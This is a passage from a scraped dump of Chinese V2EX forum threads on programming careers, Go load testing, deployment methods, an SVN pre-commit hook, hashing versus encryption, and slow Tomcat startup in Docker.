alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_11.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_12.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_13.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_14.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_15.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_16.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_17.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_18.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_19.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_20.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_21.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_22.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_23.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_24.png\">\n<img alt=\"3\" src=\"https://raw.githubusercontent.com/xiaojiaqi/10billionhongbaos/master/images/png/2_25.png\"></p>\n</div></div>"], "reply": "15", "tittle": "用 golang 实现了一个单机百万的系统， 可以支撑微信 100 亿红包那个强度的压力，欢迎 github 加星", "comment": ["点赞", "start 先点再看。", "然并卵\r", "\r", "给您加上个“牛逼”的“有情怀”的产品经理。", "领导看了非常感动，把买负载均衡设备的预算给砍了……", "配合腾讯的一起看\r", "\r", "5 天 2 亿活跃用户， 2017QQ “ LBS+AR ”天降红包活动后台揭密\r", "LZ 无疑是牛逼的，我想请教下 LZ 的性能测试工具是用的什么？", "厉害", " 性能测试分为 外部和内部，外部靠 ethtool 监控网络流量， 其他的还有 top dstat 这样的性能监控， 内部靠原子计数器 对很多节点计数，在监控节点汇总", "文章覆盖知识点挺全的，点个赞", "先点赞，明天看。", "简单的看了一下说明，没有太细致的研究，但是貌似缺少了持久化的步骤，纯内存操作确实可以很快，但是对于涉及到交易，支付的系统，如何保证整个流程的完整性和数据的可靠性?", " 如果你看了微信的文章就知道，支付也不是在微信接入服务器做的。持久化 交易是靠支付保证的。支付每秒 5 万笔 大概是 双 11 的一半。对于接入，要做的就是记录一个日志就可以了，交易的一致性是靠微信支付去做的。", " 对，你说的没错。全异步队列的吞吐确实可以很高，但是大并发下消息的可靠性可能会有问题，再者既然您这边有红包生成，必然有预算管理，一个系统不可能凭空无限制生成钱出来。然而有预算的扣减必然有扣减的持久化，最后才到微信支付的交易（划账）的过程，一个预算的扣减，一个预算消费纪录的持久化这 2 个 IO 操作，必然是整个系统的瓶颈所在，所以个人感觉抛开瓶颈，测试的无非是 MQ 的性能和大并发下的内存管理问题，对于一个“系统”来说，可能差距还是有点的", " 这是由业务决定的，生成红包只需要 在生成时，持久化就可以，其次可以在发出去的时候 持久化就可以。这 2 部分的技术核心在支付，一次扣款，一次付款，当然扣款可以统一扣除。付款才需要多次执行。所以基本可以退化成 1 次。在接入服务器里 只有一次记录，关键是支付模块的记录。但是可以简单的 3 次写日志。慢慢到账，每秒 5 万笔的数目，从记录日志的角度看，并不大，交易本身的安全，交易才是关键。 我这个模拟主要在 2.3 万笔的摇操作。微信的文章也主要写接入，业务处理时直接队列化以后 发到微信支付去的。", "v 友真是给力 已经 360 星了。 谢谢支持"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>你从新开始学习了一门新的语言,并且觉得新的语言比你之前学的语言更让你兴奋,同时你打算靠这份新的语言找工作,你打算怎么开始在这条路上的第一份工作呢?\n我就拿自己举个栗子:靠培训(感觉好坑)走上程序员的道路,<a href=\"http://%E4%BB%8E%E5%BC%80%E5%A7%8B%E5%88%B0%E7%8E%B0%E5%9C%A8%E5%B0%B1%E6%98%AF%E4%B8%80%E4%BB%BD.Net\" rel=\"nofollow\">从开始到现在就是一份.Net</a> 的工作,快三年了.期间自学了 Python,并深深的爱上了它(优雅,简洁),也做个简单的小项目,例如 简单的小爬虫啊 也用 flask 做过小项目,再过 1 个多月就合同到期了.有些小迷茫..不知道改怎么办,有类似经历的 进来讲讲!</p>\n</div></div>"], "reply": "21", "tittle": "打算换语言,从新找工作你的简历打算怎么写?", "comment": ["简单啊，把你以前的工作经历写上去。\r", "程序和语言都是相通的，不会真的因为这个拒你\r", "毕竟经验在这", "期待中", " 以前的项目经历肯定是会写的.不过就相当于我在 Python 工程师这条道路上是新走的,不会被某些公司嫌弃么?", " 谢谢", "不知道楼主在哪个城市，像南京这样的二线城市，.NET 三年工作经验的话基本也能拿到 10K+了。以楼主描述的 python 经验来看，基本就是刚入门的水平，找薪水相当的基本上不太可能了。如果经济上没有压力的话，可以尝试。\r", "\r", "我也是做.NET 开发的，不知道楼主是因为纯语言因素还是因为.NET 生态的因素考虑转方向的，我说说我自己对这两方面的看法：\r", "\r", "1. .NET 生态以国内的情况来看，基本上偏企业开发为主。企业开发可能没有互联网光鲜、技术氛围浓厚，但是凡事都有两面性，有利必有弊，企业开发压力小，不用怎么加班，生活工作可以平衡，需要楼主自己权衡。\r", "\r", "2. Python 确实是门比较好玩的语言，如果楼主真的希望从事 Python 工作的话，可以考虑先在业余时间把 Python 学溜了，然后再找工作不迟。毕竟，在中国，大部分的公司还是比较现实的，雇佣你还是希望立竿见影能看到你的价值，而不是把你招进公司让你学习的。\r", "\r", "第一次回答这么长，胡言乱语一番。", "你可以试试 golang 。。。也会爱上的", " +1 而且 golang 宇比较新，招聘应该不会要求几年 golang 经验 😁", " 最开始的时候我还真的看了点。不过不知道 golang 能做什么。", "如果你真喜欢 Python ，薪资少点都可以，先把工作接下来，资历要积累。", " 谢谢能回复的这么多，说的一点的都没错，我纠结的就是能不能放得下，可现在想来我也没什么可放不下的，我只是想在技术这条路上走的更远一些，不希望被时间给忘掉，可能是我工作上的原因导致我感觉我这都快和开发界脱节了的样子", " 恩恩。我感觉我都可以接受 Python 实习的工作了 /(ㄒoㄒ)/~~", "那就亮出语言之间通用的东西来看看", "我也和你一样，做了 3 年的 Cocos 游戏开发，现在想转做 Unity 。虽然没你跨度那么大，但也比较艰难，主要是新方向高级职位觉得你背景不符不想要，低级职位又都是按照新手去定薪酬，实在太低，等于把自己这几年的其实很多共通的项目经验都忽略了，感觉有点作践自己。\r", "\r", "我觉得最好的办法是尽快熟悉新领域，有自己这几年的工作经验，应该可以很快熟悉新东西，然后搞个拿的出手的东西来，带着东西去面试，这样谈个差不多的职位应该问题不大。", " 嗯嗯，既然想转肯定有理由。能做出东西肯定就能代表着什么", " 两年.NETER 求面试技巧，最近换工作", "有舍才有得，非常欣赏楼主这样有魄力的。语言说到底只是工具，面对不同的工程各有优势而已，相信你之前三年在.Net 上的积累可以帮助你高效地进行 python 学习。楼主如果在上海的话可以微信找我（同论坛 ID ）， golang 和 python 都可以聊。", " 谢谢，等以后有机会的吧，目前人还在帝都吸霾中", "  你去知乎上看看，有很多面试技巧的答案。", " 你想要什么技巧，有什么说什么。会什么说什么。切记少吹牛逼", " 唔，我觉得从表面来看 python 能干的 golang 也能干。只是 cpu 密集型的 golang 也得吃土。但是其服务器开发优势明显。。看个人- -！我是觉得转行一定转到一个不需要 XX 年经验这样的语种上去。省的在简历上掰扯半天", " 谢谢大佬教育。"]},
{"content": ["<div class=\"topic_content\">一直是老婆在弄的，好像是为了卖食品用了假的食品流通证之类的，被永久封了帐号，本来觉得也没什么，后来突然想到万一以后去阿里面试，是不是这一点就被咔了。。如果去蚂蚁金服的话是不是就没影响？</div>", "<div class=\"topic_content\">这个永久封号好严重，淘宝买家功能都永久不能用了。。支付宝又不能解绑。老婆平时在做啥我根本就不知道，没想到搞出这么大个事情。。。我其实还挺想去面试蚂蚁金服的，有没有阿里 HR 或者阿里内部员工来说说这个事情啊，万分感谢！</div>"], "reply": "57", "tittle": "自己名下淘宝店铺被永久封了，这样对去阿里面试有影响吗？", "comment": ["去吧，就当做没影响，不要浪费了机会", "不要纠结自己无法控制的因素", " 现在还没呢，我是怕以后要是有机会的时候这一点有问题。。想看看有没有有经验的或者阿里内部的指点指点。", "你想多了，虽然是一个公司，但是 HR 那边的人力系统和淘宝店铺的系统基本不太可能是互通的", " 我是有看到说阿里巴巴员工是不能开淘宝店铺的，是 15 年阿里反腐之后的规定，所以想到面试的时候肯定要查，就是不知道这个污点有没有影响，是只影响淘宝网这个公司还是整个阿里集团。", "那就去百度呗。。。。反正你都是假设", "角度刁钻 = =!", "......", "幸亏当年小学时用番茄家园没被 hr 发现，现在想想一身冷汗啊", " #9 大赞评论！", "你去做第一人试试", "去吧，因为这个不让你进公司又是一波大新闻。", "2L 说的有道理", "还没做就想那么多..以后再算..进去坐好了再聊", "开众泰去保时捷面试，结果保安没让进门。。。", "阿里的 HR 应该也在 V2 出没，说不定会直接告诉你答案", "为了不让小时候我偷妈几十块钱去买吃的 这件事情\r", "\r", "被所有的 H R 发现。我自由职业到现在~萌萌哒！", "你老婆犯事情和你有毛关系，又不是招你老婆", "直接去面，如果不行，也不会后悔没争取过。", "我的淘宝店铺因为实名认证复查照的照片不太清晰 永久关闭店铺 申诉一年半无果。 对阿里好心累。", " 账号和店铺是走身份证开的。。。", "想知道为什么一直不给我开通借呗吗？", " +1", " 是我身份证开的。", " 听我老婆说阿里这两年为了打假，封号封地异常频繁。", "蛋疼的问题", " 所以你现在微软吗？", "不会。没有这一道审查手续。", "大公司不会怎么玩起来的，放心吧", " 是真的吗？您是在阿里做过的吗，突然好激动 T_T", " hr 也是用盗版，国内真正用正版 Windows 的公司可以说很少", " 他在微软工作……", "不能在淘宝购物？这么惨？\r", "我有点好奇你的芝麻信用分是不是特别低......", "试试吧万一过了呢，进去删数据库，跑路", " 都是小公司吧", " 刚被封，目前支付宝没影响", "若干年前，我给自己的淘宝店刷信誉，结果被封到 2999 年，结果没过几个月，又让我考试，考过了，现在店铺又开张出来骗小朋友了", "本来没察觉的，你发个贴 hr 就知道了", " 啥情况能给考试机会啊，你这个情况看上去挺轻的，我这个就重了。。", "去吧，说不定进去了还能解绑呢", "离婚 :)", "AWS 我试用一年后没有续费给亚马逊公司做贡献，好怕怕啊...", "被评论逗笑了😂", "又不是违法和违背道德的事。。。", "什么？你卖假货？！\r", "明天来阿里上班", "没有什么问题的。\r", "从企业角度来说，阿里面试过不过要看“气味”的。如果 HR 觉得你有阿里人的“气味”就会通过。\r", "从个人角度来说，讲道理，早几年借朋友身份证开淘宝店的人超级多，这笔烂账根本算不完，所以，没有关系的。\r", "放心去吧。", "可能腾讯的人会来找你", " 感谢回复，希望是这样。", "居然弄假证\r", "明显跟 ali “诚信”的价值不符\r", "\r", "根据从抢个月饼就不契合价值观，被开除的结果来看\r", "\r", "楼主靠近 ali 300m 内  可能会被打\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "不过\r", "腾讯可能会要你", " 再说一句 \r", "这事儿的确是楼主不厚道\r", "\r", "买食品都敢作假\r", "Ps ：要是敢说老婆的事儿跟自己没关系，那就更不厚道了", "我之前拿到过阿里的 offer ，的确提到淘宝账户的问题，但是更多的是说不能自己作为卖家，可能是怕自己靠这个赢取一些其他利益，至于是不是被封掉了， offer 里并没有写", " 我老婆卖的东西都是真的，但是淘宝一定要那个证才能卖。\r", "就比如你从外国带回来一些吃的，吃不完想在淘宝上卖掉，结果淘宝一定要你的有证才能卖，差不多就是这个意思。\r", "无论什么事情都是老婆最重要，啥都可以没但是不能没老婆~~", " 是拿了 offer ，在 offer 上写的吗？就是如果有店的话让你把店关了咯？你拿的是淘宝的 offer 吗？还是跟淘宝没关系的其他子公司的？", " 是我不厚道，我认了 T_T", "原谅我不厚道地笑了起来...", " 前公司 80 多人，就因为盗版系统被微软发过律师函…………", " 我前公司最开始提供的是自带正版 Windows 的笔记本电脑，如果需要重装系统， hr 会给你一个 U 盘，里面各种版本，然后……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://%E5%83%8F.net\" rel=\"nofollow\">像.net</a> golang 这种语言，编译后生成二进制文件，可以直接扔进服务器，但，静态资源呢？</p>\n<p>向服务器部署的时候：</p>\n<ol>\n<li>\n<p>使用 ftp ，但是有个缺点，第一次部署可以直接全部上传整个文件下（二进制和静态资源），那第二次呢，假如 js 或者 css 增加了文件或删除了文件，需要自己记住改动了哪些文件，然后去服务器上修改对应的文件</p>\n</li>\n<li>\n<p>为即将部署的内容新建一个 git 仓库，缺点就是要新建一个仓库，麻烦点，同步时需要同步两个仓库</p>\n</li>\n</ol>\n<p>请问各位还有其他方式吗？</p>\n</div></div>"], "reply": "26", "tittle": "[讨论]静态语言怎么部署最方便", "comment": ["rsync", " 总得新建一个文件夹，里面存放要同步到服务器的内容，还不如 git 呢", "samba", "这个可以使用自动化运维的思想\r", "1. 建立一个配置文件，规定需要同步的文件，设定好远程 ftp/ssh 配置信息\r", "2. 脚本每次运行时检查需要同步的文件是否大小或者哈希发生改变，如果改变则同步变动的文件\r", "脚本写好后，只需一键即可自动化同步\r", "\r", "以上是我们在做项目中，发布新版本后，同步版本到更新服务器的大致解决思路，仅供参考\r", "\r", "如果题主有何疑问，我很乐意请教", "目前最好的方式是 docker ，私以为 docker 最大的优点是颠覆研发流程中的交付环节。编写 Dockerfile ，在 CI 环节编译打包工程，通过 dockerfile 来就地构建镜像（把编译产物与静态文件 copy 到镜像中是 Dockerfile 应描述的职责），最后将 image push 到公有私有仓库中。\r", "\r", "容器启动就是一瞬间，秒级的。", "新建个一个 branch 就好  专门放 binary 和配置什么的", " 确实是个好方法，不过这个脚本似乎不太好写，要检查目录和遍历检查文件，有不同要 push 上去", " 交付方便，那对项目的版本更新呢，顺便问下 docker 对服务器配置有要求吗？小内存是不是吃不消", " 也不错，多谢", " docker 的镜像是带 tag 的， tag 尾部是版本号。完全可以每次 git 提交都自动构建一个不同版本号的镜像（不可变运维）。至于性能，对服务器没附加要求，因为 docker 容器 run 起来后本质就是个宿主机的进程。有余力的话可以先深入了解下， segmentfault 站上面讲用容器技术 CI/CD 的例子还是很多的，与 gitlab 等的 CI 打通都是很容易的事情。", "我用 Daocloud 来做这个事情了…", " 写个 Makefile 配合 gitignore 自动化从其他 branch 编译 binary 再 push", "讲道理的话，静态资源不是应该上 CDN 或者 OSS 吗？", " 多谢，我了解下 docker\r", "\r", " 能否详细说下？是否和楼上一样？\r", "\r", " 谢谢，我试试", " html 呢", "golang html 等资源可以直接打包进入程序文件中使用，这种方案下由程序提供静态文件解析，不过不推荐。\r", "\r", "我们现在前后端是两个仓库，分开编译打包和部署。", "只是同步功能而已， rsync 不就搞定了？或者 beyond compare （支持 ftp ， sftp ）之类的可视化同步。都很方便啊", " 模板也要打包啊，解压不是应该有对应的路径吗？就好像游戏一样，程序会自动从项目位置开始加载文件（资源）", "ansible 或者 puppet", " 实际上是不行的，不信你试试", " 也就这法子了，虽然麻烦点，但省心", " 不太明白为什么不行，我一般是用 beyond compare 手动同步，点点鼠标就行，感觉挺方便的", " bc 本地文件夹之间同步还行，但是同步 ftp 上的目录就不行了，你可以弄几个 html 文件试试", " 我估计你的比较规则设置里只有时间和文件大小，如果是 ftp 的话就不行了，因为时间戳会变，需要把“ compare content ”打开，我一般是选“ Rules-based comparison\",还有其他几个选项可以加快速度。\r", "如果 server 目录用 samba 共享出来，这样拷贝的时候时间戳就不会变， BC 的缺省规则就可以了", " 刚看了下， BC 的 FTP 同步也会同步时间戳， html 同步后显示不同的原因是 ftp 上传时回车换行转换导致文件大小不一致，这个可以用我上面说的用比较规则选” Rules-based comparison\"来解决，也可以把 ftp 设置里的传输类型由 auto 改成 binary 来解决。", " 多谢，回去试试"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>搞了个微信机器人玩，为啥经常返回 1205 的错误。只是用户来发文本和图片的。发了一会之后老是出现 ret=1205 ，这个好像是发送频繁。请问有没有办法避免？</p>\n</div></div>"], "reply": "2", "tittle": "搞了个微信机器人玩，为啥经常返回 1205 的错误。", "comment": ["kanwendang", "  额！哪里有文档？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我去了解了 RN ， IONIC ， WEEX 。感觉 WEEX 还不成熟，文档也少。 RN 应该是这之中最成熟的框架。想问一下大家，哪个框架比较好？或者还有更好的？</p>\n</div></div>"], "reply": "8", "tittle": "目前比较好 Android 和 IOS 的 HTML5 框架是？", "comment": ["没有更好，只有更适合😜", "好的处理方法时原生搭配 html5 ，我个人喜欢原生搭配 sencha", "vue+cordova", "可以参考一下这个列表 ", "cordova 效率比较低。低端 Android 手机很卡", "react native 很多家都在用了：\r", "airbnb\r", "沃尔玛\r", "fb 家就不用说了", " 这工具相当不错。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>三种方式都是通过某种公开的算法将原始信息进行编码 /加密</p>\n<ol>\n<li>\n<p>编码：将数据转化成某种固定的格式的编码信息，方便不同系统间的传输，<strong>通过解码编码信息可以得到原始信息</strong></p>\n</li>\n<li>\n<p>摘要（哈希）：验证信息的唯一性，<strong>不能通过哈希值还原原始信息</strong></p>\n</li>\n<li>\n<p>加密：加密传输信息，保证信息的安全性，<strong>通过密钥和密文可以还原原始信息</strong></p>\n</li>\n</ol>\n<p><a href=\"http://goldenera.me/2017/02/16/%E7%BC%96%E7%A0%81%E3%80%81%E6%91%98%E8%A6%81%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8C%BA%E5%88%AB/\" rel=\"nofollow\">编码、摘要、加密的区别</a></p>\n</div></div>"], "reply": "12", "tittle": "编码、摘要、加密的区别", "comment": ["关于散列的进一步讨论可以看我的这篇文章： ", " （三年前写的，可能有的地方不恰当，但刚刚我又看了一遍，大体没问题）。\r", "\r", "其实我觉得「散列」这个意译要比「哈希」好很多，楼主的文章没有提到散列这个称呼。", "1. base64, zip, 7z, gzip, rar, flac, ape\r", "2. md5, sha, crc\r", "3. aes, pgp", " 哈 你的网名", "摘要（哈希）：验证信息的唯一性。应该是完整性吧。不是有 MD5 这类 不一样文件一样的 MD5 。", "验证信息的正确性才对吧。", "验证信息的唯一性 -> 验证信息的完整性", " 看了，介绍的更加深入。\r", "实际上，我看到关于密码存储的最佳实践是不建议使用散列算法，即便是加盐或者多次散列。原因我记得是这么说的，好的加密算法就是即便你的源码泄漏，攻击者这不能窃取到密码。\r", " 谢谢，马上更改", " 谢谢，我查了下 wiki ，应该是完整性\r", " 谢谢，已经改了", "开个玩笑，以方便面为例：\r", "编码：面饼可以通过桶装、袋装的形式运输，撕开包装（解码）即可得到面饼；\r", "加密：面条被脱水后形成面饼，每个脱水面饼都会有细微的不同，加热水（解密）即可得到真正的面条\r", "摘要：方便面的包装内有一张武将卡（假设不重复）", "设定一个相空间 A 和相空间 B\r", "\r", "最高抽象层次上，编码，哈希和加密都是内容从 A 到 B 的一个变换。\r", "\r", "第二抽象层次上，\r", "编码是内容从 A 到 B 的一对一变换。（不严格的说）\r", "哈希是内容从 A 到 B 的多对一变换。\r", "加密是内容从 A 到 B 的一对一变换。\r", "\r", "第三抽象层次上，\r", "编码和加密的不同在于，编码从 B 到 A 的变换是容易的，或日常应用直接应用 B 空间的内容更容易（比如视频编码，一般不需要变回原空间）。加密从 B 到 A 则越麻烦（对于不知道密钥的人）越好。这种麻烦程度就是加密强度。", "编码有无损编码和有损编码,有损编码(比如很多多媒体编码)不一定能还原出原始信息", " 所以是不严格的说编码是一对一的，详细说的话，源内容经过有损编码，再反变换到 A 空间后，总还是保留了比较多的信息。用几何语言描述，就是反变换的内容在 A 空间中，距离原内容位置较近。编码过程中的损失就是噪音，信噪比衡量反变换回原空间后与源距离\r", "的大小。信号传输也是一种相空间中的有损变换，抽象的说是一种东西。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>React 中“灵光乍现”的那些瞬息</h2>\n<blockquote>\n<ul>\n<li>原文地址：<a href=\"https://medium.freecodecamp.com/react-aha-moments-4b92bd36cc4e#.jxiocbkv5\" rel=\"nofollow\">React “ Aha ” Moments</a></li>\n<li>原文作者：<a href=\"https://medium.freecodecamp.com/@tylermcginnis?source=post_header_lockup\" rel=\"nofollow\">Tyler McGinnis</a></li>\n<li>译文出自：<a href=\"https://github.com/xitu/gold-miner\" rel=\"nofollow\">掘金翻译计划</a></li>\n<li>译者： <a href=\"https://github.com/aleen42\" rel=\"nofollow\">aleen42</a></li>\n<li>校对者：<a href=\"https://github.com/Tina92\" rel=\"nofollow\">Tina92</a>、<a href=\"https://github.com/sqrthree\" rel=\"nofollow\">sqrthree</a></li>\n</ul>\n</blockquote>\n<img src=\"https://cdn-images-1.medium.com/max/800/0*6nyVYm78oKNBrvd8.jpg\">\n<p>作为一名教师，我的主要目标之一就是要去让学生能遇到更多这种“灵光乍现”的瞬息。</p>\n<p>所谓<a href=\"https://en.wikipedia.org/wiki/Eureka_effect\" rel=\"nofollow\">“灵光乍现”的瞬息</a>，指的就是一个人突然洞悉或阐明某事物的那一瞬间。而正是那一刻，使得该人明白了很多事情。当然，我们每个人都会有所体验。而在我看来，最优秀的教师就是能因人施教，以使得学生能遇到更多的“灵光乍现”。</p>\n<p>在过去几年，我曾采用过各种流行的教学方法去施教 React 。在整个过程中，尤其是对于学习 React 的过程，我都记录了一些会遇到“灵光乍现”的情况。</p>\n<p>更多请前往<a href=\"https://github.com/xitu/gold-miner/blob/master/TODO/react-aha-moments.md\" rel=\"nofollow\">原文</a>阅读</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "[译] React 中“灵光乍现”的那些瞬息", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我在 仓库名／ hooks 目录下增加了 pre-commit 文件， svn 提交的时候没生效啊，求帮助，内容具体如下：</p>\n<pre><code>#!/bin/sh\n\n# PRE-COMMIT HOOK\n#\n# The pre-commit hook is invoked before a Subversion txn is\n# committed.  Subversion runs this hook by invoking a program\n# (script, executable, binary, etc.) named 'pre-commit' (for which\n# this file is a template), with the following ordered arguments:\n#\n#   [1] REPOS-PATH   (the path to this repository)\n#   [2] TXN-NAME     (the name of the txn about to be committed)\n#\n#   [STDIN] LOCK-TOKENS ** the lock tokens are passed via STDIN.\n#\n#   If STDIN contains the line \"LOCK-TOKENS:\\n\" (the \"\\n\" denotes a\n#   single newline), the lines following it are the lock tokens for\n#   this commit.  The end of the list is marked by a line containing\n#   only a newline character.\n#\n#   Each lock token line consists of a URI-escaped path, followed\n#   by the separator character '|', followed by the lock token string,\n#   followed by a newline.\n#\n# The default working directory for the invocation is undefined, so\n# the program should set one explicitly if it cares.\n#\n# If the hook program exits with success, the txn is committed; but\n# if it exits with failure (non-zero), the txn is aborted, no commit\n# takes place, and STDERR is returned to the client.   The hook\n# program can use the 'svnlook' utility to help it examine the txn.\n#\n# On a Unix system, the normal procedure is to have 'pre-commit'\n# invoke other programs to do the real work, though it may do the\n# work itself too.\n#\n#   ***  NOTE: THE HOOK PROGRAM MUST NOT MODIFY THE TXN, EXCEPT  ***\n#   ***  FOR REVISION PROPERTIES (like svn:log or svn:author).   ***\n#\n#   This is why we recommend using the read-only 'svnlook' utility.\n#   In the future, Subversion may enforce the rule that pre-commit\n#   hooks should not modify the versioned data in txns, or else come\n#   up with a mechanism to make it safe to do so (by informing the\n#   committing client of the changes).  However, right now neither\n#   mechanism is implemented, so hook writers just have to be careful.\n#\n# Note that 'pre-commit' must be executable by the user(s) who will\n# invoke it (typically the user httpd runs as), and that user must\n# have filesystem-level permission to access the repository.\n#\n# On a Windows system, you should name the hook program\n# 'pre-commit.bat' or 'pre-commit.exe',\n# but the basic idea is the same.\n#\n# The hook program typically does not inherit the environment of\n# its parent process.  For example, a common problem is for the\n# PATH environment variable to not be set to its usual value, so\n# that subprograms fail to launch unless invoked via absolute path.\n# If you're having unexpected problems with a hook program, the\n# culprit may be unusual (or missing) environment variables.\n#\n# Here is an example hook script, for a Unix /bin/sh interpreter.\n# For more examples and pre-written hooks, see those in\n# the Subversion repository at\n# http://svn.apache.org/repos/asf/subversion/trunk/tools/hook-scripts/ and\n# http://svn.apache.org/repos/asf/subversion/trunk/contrib/hook-scripts/\n\n\nREPOS=\"$1\"\nTXN=\"$2\"\n\n# Make sure that the log message contains some text.\nSVNLOOK=/usr/local/bin/svnlook\n#$SVNLOOK log -t \"$TXN\" \"$REPOS\" | \\\n#   grep \"[a-zA-Z0-9]\" &gt; /dev/null || exit 1\n\n# Check that the author of this commit has the rights to perform\n# the commit on the files and directories being modified.\n# commit-access-control.pl \"$REPOS\" \"$TXN\" commit-access-control.cfg || exit 1\n\n# ./../vendor/squizlabs/PHP_CodeSniffer/scripts/phpcs-svn-pre-commit --standard=PSR1,PSR2 --tab-width=4 \"$REPOS\" -t \"$TXN\" &gt;&amp;2 || exit 1\nLOGMSG=`$SVNLOOK log -t \"$TXN\" \"$REPOS\" | grep \"[a-zA-Z0-9]\" | wc -c`\nif [ \"$LOGMSG\" -lt 5 ];#要求注释不能少于 5 个字符，您可自定义\nthen\n  echo -e \"\\nLog message cann't be empty! you must input more than 5 chars as comment!.\" 1&gt;&amp;2\n  exit 1\nfi\n\n</code></pre>\n</div></div>", "<div class=\"topic_content\">已解决～ 谢谢 大家～</div>"], "reply": "6", "tittle": "svn 钩子 hooks 的 pre-commit 怎么配置的啊？", "comment": ["怎么不生效了？另外你要注意 grep 会输出额外的 \\n, 也会同时被 wc -c 计算到的", " 搞定了，谢谢～", " 撸主 windows 服务器钩子可配置过，提交不行？", " 没搞过，应该差不多，就是路径应该不一样～", "这个是用来搞代码 review 的？", " 搞代码编码格式自动化检测，哈哈～"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个初始化的 tomcat7,jre7 ，但是 Deploy 自带的 examples 竟然要 9 分钟。</p>\n<pre><code>Feb 20, 2017 3:02:28 AM org.apache.catalina.startup.HostConfig deployDirectory\nINFO: Deploying web application directory /usr/local/tomcat/webapps/examples\nFeb 20, 2017 3:11:45 AM org.apache.catalina.util.SessionIdGeneratorBase createSecureRandom\nINFO: Creation of SecureRandom instance for session ID generation using [SHA1PRNG] took [555,272] milliseconds.\nFeb 20, 2017 3:11:45 AM org.apache.catalina.startup.HostConfig deployDirectory\nINFO: Deployment of web application directory /usr/local/tomcat/webapps/examples has finished in 557,089 ms\nFeb 20, 2017 3:11:45 AM org.apache.catalina.startup.HostConfig deployDirectory\nINFO: Deploying web application directory /usr/local/tomcat/webapps/manager\nFeb 20, 2017 3:11:45 AM org.apache.catalina.startup.HostConfig deployDirectory\n</code></pre>\n<p><a href=\"https://yq.aliyun.com/ask/20703/\" rel=\"nofollow\">网上</a>说是 sessionid 的问题，但是我不知道怎么设置非阻塞熵池策略。。</p>\n<p><a href=\"http://i.imgur.com/MVVwkUN.png\" rel=\"nofollow\">http://i.imgur.com/MVVwkUN.png</a></p>\n<p><a href=\"http://i.imgur.com/xQsAfEW.png\" rel=\"nofollow\">http://i.imgur.com/xQsAfEW.png</a></p>\n<p>但是9 分钟也太久了吧。请问怎么设置非阻塞熵池策略</p>\n<p>用的是腾讯云的学生机，最低的 1G 配置。\n有知道的大触帮忙看一下呗。</p>\n</div></div>", "<div class=\"topic_content\">果然是 sessionId 的问题， ORZ.\r<br>[有两种解决方法]( <a target=\"_blank\" href=\"https://my.oschina.net/wangnian/blog/687914)%EF%BC%9A\" rel=\"nofollow\">https://my.oschina.net/wangnian/blog/687914)：</a>\r<br>第一种我试了一下没效果，所以用了第二种，直接 exec 进入 container 然后修改 securerandom.source 。\r<br>效果显赫,2619ms ：\r<br>\r<br><a target=\"_blank\" href=\"http://i.imgur.com/G3ESWNl.png\"><img src=\"http://i.imgur.com/G3ESWNl.png\" class=\"embedded_image\"></a><br>\r<br>感谢 @<a target=\"_blank\" href=\"/member/zpf124\">zpf124</a> 的热心回复。： P\r<br>最后把镜像 commit 一下，需要的朋友就不用等待 n 分钟再自行修改了。\r<br>需要[自取]( <a target=\"_blank\" href=\"https://hub.docker.com/r/errorlife/tomcat/\" rel=\"nofollow\">https://hub.docker.com/r/errorlife/tomcat/</a>)</div>"], "reply": "11", "tittle": "为何我的 Docker 运行 tomcat 奇慢——9 分钟", "comment": ["[补一张完整的 log]( ", ")", "把那行生成安全的随机数的用时太长的日志 搜索一下 找到一个可能的答案。\r", " 恩恩，貌似有两种解决方法：\r", "1 ）在 Tomcat 环境中解决\r", "\r", "可以通过配置 JRE 使用非阻塞的 Entropy Source 。\r", "\r", "在 catalina.sh 中加入这么一行：-Djava.security.egd=file:/dev/./urandom 即可。\r", "\r", "加入后再启动 Tomcat ，整个启动耗时下降到 Server startup in 2912 ms 。\r", "\r", "2 ）在 JVM 环境中解决\r", "\r", "打开$JAVA_PATH/jre/lib/security/java.security 这个文件，找到下面的内容：\r", "\r", "securerandom.source=file:/dev/random\r", "\r", "替换成\r", "\r", "securerandom.source=file:/dev/urandom\r", "\r", "from ", "\r", "\r", "不过我 exec 进入 container 修改了 catalina.sh ，但是貌似效果不明显。\r", "第二种的话不知道怎么进入 JVM 环境", " 既然用的 docker 那么在 build 的时候直接 dockerfile 里边 sed 